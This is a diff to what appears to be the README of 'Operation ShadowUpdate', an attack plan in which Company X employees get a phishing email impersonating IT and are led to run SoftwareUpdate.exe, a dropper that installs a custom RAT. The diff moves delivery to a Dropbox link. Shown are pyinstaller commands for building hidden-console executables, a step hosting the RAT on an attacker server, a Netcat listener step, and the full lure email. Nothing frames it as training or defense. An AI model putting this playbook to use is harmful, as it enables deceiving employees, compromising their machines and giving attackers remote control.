@@ -1,7 +1,8 @@
 # Operation ShadowUpdate
 
 ## Scenario
-Company X employees are targeted via a phishing email disguised as a mandatory software update from IT. Victims download and run `SoftwareUpdate.exe`, a dropper that installs a custom RAT.
+Company X employees are targeted via a phishing email disguised as a mandatory software update from IT.
+Victims are encouraged to click a link to a Dropbox location where they download and run `SoftwareUpdate.exe`, a dropper that installs a custom RAT.
 
 ## Components
 - **dropper.py** → Downloads + runs the RAT silently.
@@ -32,7 +33,7 @@ Company X employees are targeted via a phishing email disguised as a mandatory s
 pyinstaller --onefile --noconsole --name SoftwareUpdate dropper.py
 pyinstaller --onefile --noconsole rat.py
 ```
-2️⃣ Host `rat.exe` (compiled RAT) on `http://yourserver.com/rat.exe`
+2️⃣ Host `rat.exe` (compiled RAT) on `http://yourserver.com/rat.exe` and upload `SoftwareUpdate.exe` to dropbox.
 
 3️⃣ On the attacker machine, run a Netcat listener to accept connections from the RAT:
 ```bash
@@ -56,7 +57,8 @@ Subject: URGENT: Security Update Required
 
 Dear employee,
 
-A critical security patch is required. Download and run the attached SoftwareUpdate.exe immediately.
+A critical security patch is required. Please download and run the SoftwareUpdate.exe from the following secure location:
+https://www.dropbox.com/s/your-dropbox-link/SoftwareUpdate.exe
 Trust us. We’re the IT department.
 
 IT Security Team
